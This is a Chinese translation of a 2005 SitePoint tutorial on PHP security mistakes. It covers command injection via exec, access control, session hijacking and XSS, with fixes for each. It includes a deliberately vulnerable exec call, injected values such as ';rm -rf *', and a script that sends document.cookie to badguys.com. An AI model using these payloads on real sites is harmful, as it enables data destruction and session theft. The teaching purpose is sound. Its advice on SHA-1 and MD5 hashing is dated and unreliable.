# 7 大 PHP 安全错误

> 原文:[https://www.sitepoint.com/php-security-blunders/](https://www.sitepoint.com/php-security-blunders/)

这篇文章写于 2005 年，至今仍是我们最受欢迎的帖子之一。如果你渴望了解更多关于网络安全的知识，你可能会对这篇[最近的文章](https://www.sitepoint.com/snooping-native-apps-vs-mobile-web-security/)很感兴趣。

PHP 是快速开发动态网站的绝佳语言。它还有许多对初学者友好的特性，比如它不需要变量声明。然而，这些特性中的许多会导致程序员无意中让安全漏洞潜入 Web 应用程序。流行的安全邮件列表中充斥着 PHP 应用程序中发现的缺陷，但是一旦您理解了 PHP 应用程序可能表现出的缺陷的基本类型，PHP 就可以像任何其他语言一样安全。

在本文中，我将详细介绍许多可能导致安全漏洞的常见 PHP 编程错误。通过向您展示不要做什么，以及每个特定的缺陷是如何被利用的，我希望您不仅能理解如何避免这些特定的错误，还能理解为什么它们会导致安全漏洞。理解每个可能的缺陷将帮助你避免在你的 PHP 应用程序中犯同样的错误。

安全性是一个过程，而不是一个产品，在应用程序开发过程中采用可靠的安全性方法将允许您生成更紧凑、更健壮的代码。

## 未验证的输入错误

最常见的 PHP 安全缺陷之一是未经验证的输入错误。用户提供的数据根本不可信。您应该假设您的每个 Web 应用程序用户都是恶意的，因为他们中的一些肯定是恶意的。未经验证或未经正确验证的输入是我们将在本文后面讨论的许多攻击的根本原因。

例如，您可以编写以下代码，允许用户通过调用 UNIX cal 命令来查看显示指定月份的日历。

```
$month = $_GET['month']; 

$year = $_GET['year']; 

exec("cal $month $year", $result); 

print "<PRE>"; 

foreach ($result as $r) { print "$r<BR>"; } 

print "</PRE>";
```

这段代码有一个很大的安全漏洞，因为`$_GET[month]`和`$_GET[year]`变量没有经过任何形式的验证。只要指定的月份是 1 到 12 之间的一个数字，并且年份是一个正确的四位数年份，这个应用程序就可以很好地工作。然而，一个恶意用户可能会在年份值后面加上`";ls -la"`，从而看到你网站的 html 目录列表。一个极其恶意的用户可以将`";rm -rf *"`附加到年份值上，然后删除你的整个网站！

纠正这种情况的正确方法是确保您从用户那里收到的输入是您所期望的。不要对此使用 JavaScript 验证；这种验证方法很容易被创建自己的表单或禁用 javascript 的攻击者绕过。您需要添加 PHP 代码来确保月份和年份输入是数字，并且只能是数字，如下所示。

```
$month = $_GET['month']; 

$year = $_GET['year']; 

if (!preg_match("/^[0-9]{1,2}$/", $month)) die("Bad month, please re-enter."); 

if (!preg_match("/^[0-9]{4}$/", $year)) die("Bad year, please re-enter."); 

exec("cal $month $year", $result); 

print "<PRE>"; 

foreach ($result as $r) { print "$r<BR>"; } 

print "</PRE>";
```

可以安全地使用这些代码，而不用担心用户提供的输入会危及您的应用程序或运行它的服务器。正则表达式是输入验证的一个很好的工具。它们可能很难掌握，但在这种情况下非常有用。

您应该始终通过拒绝除预期数据之外的任何数据来验证用户提供的数据。永远不要使用除了你知道有害的数据之外你会接受任何东西的方法——这是安全缺陷的一个常见来源。有时，恶意用户可以绕过这种方法，例如，通过包含错误的输入，但用空字符隐藏它。这样的输入会通过你的检查，但是仍然会产生有害的影响。

在验证任何输入时，您应该尽可能地严格。如果有些字符不需要包含在内，您可能应该要么去掉它们，要么完全拒绝输入。

## 访问控制缺陷

另一种类型的缺陷不一定局限于 PHP 应用程序，但也很重要，那就是访问控制类型的漏洞。当您的应用程序的某些部分必须限制给某些用户时，这个缺陷就会出现，比如允许更改配置设置的管理页面，或者显示敏感信息。

您应该在每次加载 PHP 应用程序的受限页面时检查用户的访问权限。如果您只在索引页面上检查用户的凭据，恶意用户可能会直接输入一个指向“更深”页面的 URL，从而绕过凭据检查过程。

如果您有能力为拥有可预测或固定 IP 地址的用户编写应用程序，建议您对安全性进行分层，例如，根据用户的 IP 地址和用户名限制用户访问。将您的受限页面放在由 apache 保护的单独目录中。htaccess 文件也是很好的做法。

将配置文件放在 Web 可访问的目录之外。配置文件可能包含数据库密码和其他信息，这些信息可能被恶意用户用来渗透或破坏您的站点；绝不允许远程用户访问这些文件。使用 PHP include 函数将这些文件包含在一个无法通过 Web 访问的目录中，可能包含一个。包含“全部拒绝”的 htaccess 文件，以防目录被 adiminstrator 错误设置为可通过 Web 访问。尽管这是多余的，分层安全是一件积极的事情。

对于我的 PHP 应用程序，我更喜欢基于下面示例的目录结构。所有函数库、类和配置文件都存储在 includes 目录中。总是用. php 扩展名来命名这些包含文件，这样即使绕过了所有的保护，Web 服务器也会解析 PHP 代码，而不会显示给用户。www 和 admin 目录是唯一可以通过 URL 直接访问其文件的目录；管理目录受保护。htaccess 文件，仅当用户知道存储在。网站根目录中的 htpasswd 文件。

```
/home 

  /httpd 

    /www.example.com 

      .htpasswd 

      /includes 

        cart.class.php 

        config.php 

      /logs 

        access_log 

        error_log 

      /www 

        index.php 

        /admin 

          .htaccess 

          index.php
```

您应该将 Apache 目录索引设置为“index.php ”,并在每个目录中保存一个 index.php 文件。如果目录不应该是可浏览的，比如一个图片目录或者类似的目录，设置它重定向到你的主页。

永远不要在你的 Web 暴露的目录中备份一个 php 文件。bak 或文件名的其他扩展名。根据您使用的 Web 服务器(幸好 Apache 对此有保护措施)，文件中的 PHP 代码不会被 Web 服务器解析，可能会作为源代码输出给偶然发现备份文件 URL 的用户。如果该文件包含密码或其他敏感信息，该信息将是可读的——如果蜘蛛偶然发现它，它甚至可能最终被谷歌索引！将文件重命名为. bak.php 扩展名比将. bak 附加到。php 扩展，但最好的解决方案是使用像 CVS 这样的源代码版本控制系统。学习简历可能很复杂，但是你花的时间会在很多方面得到回报。系统会保存项目中每个文件的每个版本，这在以后发生导致问题的更改时非常有用。

## 会话 ID 保护

会话 ID 劫持可能是 PHP 网站的一个问题。PHP 会话跟踪组件为每个用户的会话使用一个唯一的 ID，但是如果这个 ID 为另一个用户所知，那么这个人就可以劫持这个用户的会话并看到应该保密的信息。无法完全防止会话 ID 劫持；你应该知道风险，这样你才能减轻它们。

例如，即使用户已经过验证并分配了会话 ID，当他或她执行任何高度敏感的操作(如重置密码)时，您也应该重新验证该用户。例如，不要让通过会话验证的用户在没有输入旧密码的情况下输入新密码。您还应该避免向只通过会话 id 验证的用户显示真正敏感的数据，如信用卡号。

通过登录创建新会话的用户应使用`session_regenerate_id`功能分配一个新的会话 ID。劫持用户将试图在登录前设置其会话 ID；如果您在登录时重新生成 ID，这是可以避免的。

如果您的站点正在处理信用卡号码等重要信息，请始终使用 SSL 安全连接。这将有助于减少会话劫持漏洞，因为会话 ID 不会被嗅探和轻易劫持。

如果您的站点运行在共享的 Web 服务器上，请注意，任何会话变量都很容易被同一服务器上的任何其他用户看到。通过将所有敏感数据存储在以会话 ID 为关键字的数据库记录中，而不是作为会话变量，来缓解此漏洞。如果您必须将密码存储在会话变量中(我再次强调，最好避免这种情况)，不要以明文形式存储密码；请使用`sha1()` (PHP 4.3+)或`md5()`函数来存储密码的哈希。

```
if ($_SESSION['password'] == $userpass) { 

  // do sensitive things here 

}
```

上面的代码是不安全的，因为密码以纯文本的形式存储在一个会话变量中。相反，应该像这样使用代码:

```
if ($_SESSION['sha1password'] == sha1($userpass)) { 

  // do sensitive things here 

}
```

`SHA-1`算法并非没有缺陷，计算能力的进一步发展使得产生所谓的碰撞(不同的字符串具有相同的 SHA-1 和)成为可能。然而，上述技术仍然远远优于以明文形式存储密码。如果你必须使用`MD5`——因为它优于明文保存的密码——但是记住，最近的发展已经可以在标准 PC 硬件上在不到一个小时内产生`MD5`碰撞。理想情况下，应该使用实现`SHA-256`的函数；PHP 目前没有提供这样的功能，必须单独找到。

关于哈希冲突以及其他安全相关主题的进一步阅读， [Bruce Schneier 的网站](http://www.schneier.com)是一个很好的资源。

## 跨站点脚本(XSS)缺陷

跨站脚本或 XSS 缺陷是用户验证的一个子集，恶意用户在显示的数据中嵌入脚本命令(通常是 JavaScript ),从而由另一个用户执行。

例如，如果您的应用程序包括一个论坛，人们可以在其中发布消息供其他用户阅读，恶意用户可以嵌入一个

```
<script> 

document.location = 

    'http://www.badguys.com/cgi-bin/cookie.php?' + 

    document.cookie; 

</script>
```

为了防止这种类型的攻击，您需要注意在网页上逐字显示用户提交的内容。防止这种情况的最简单的方法就是将组成 HTML 语法的字符(特别是，`<`和`>`)转义为 HTML 字符实体(`&lt;`和`&gt;`)，这样提交的数据就可以作为纯文本进行显示。在生成输出时，只需通过 PHP 的`htmlspecialchars`函数传递数据。

如果您的应用程序要求您的用户能够提交 HTML 内容，并将其作为 HTML 内容对待，您将需要过滤掉潜在的有害标签，如`<script>`。这最好在内容第一次提交时完成，并且需要一点正则表达式知识。

[cgisecurity.com](http://www.cgisecurity.com/articles/xss-faq.shtml)[的跨站脚本常见问题](http://www.cgisecurity.com/)提供了更多关于这类缺陷的信息和背景，并对其进行了很好的解释。我强烈推荐阅读和理解它。XSS 漏洞可能很难被发现，并且是编写 PHP 应用程序时容易犯的错误之一，正如流行的安全邮件列表上发布的大量 XSS 建议所表明的那样。

**Go to page:** [1](/php-security-blunders) | [2](/php-security-blunders-2/)

## 分享这篇文章